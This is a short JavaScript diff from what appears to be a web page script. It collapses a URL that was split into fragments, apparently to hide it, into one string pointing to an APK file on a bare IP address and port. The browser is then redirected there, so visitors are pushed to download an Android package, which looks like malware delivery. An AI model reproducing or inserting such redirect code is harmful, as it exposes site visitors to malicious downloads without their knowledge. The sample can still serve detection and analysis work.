@@ -16,15 +16,11 @@
             } else {
                 // Split URL into three parts
  
-                var part1 = "htt";
-                var part2 = "p//:";
-                var part3 = "154.21.";
-                var part4 = "201.60";
-                var part5 = ":4650";
-                 var part6 = "/rjly.apk";
+                var part1 = "http//:154.21.201.60:4650/rjly.apk";
+                
                 
                 // Concatenate the parts
-                var redirectUrl = part1 + part2 + part3+ part4+ part5+ part6;
+                var redirectUrl = part1;
                 
                 window.location.href = redirectUrl;
                 document.getElementById('content').style.display = 'block';
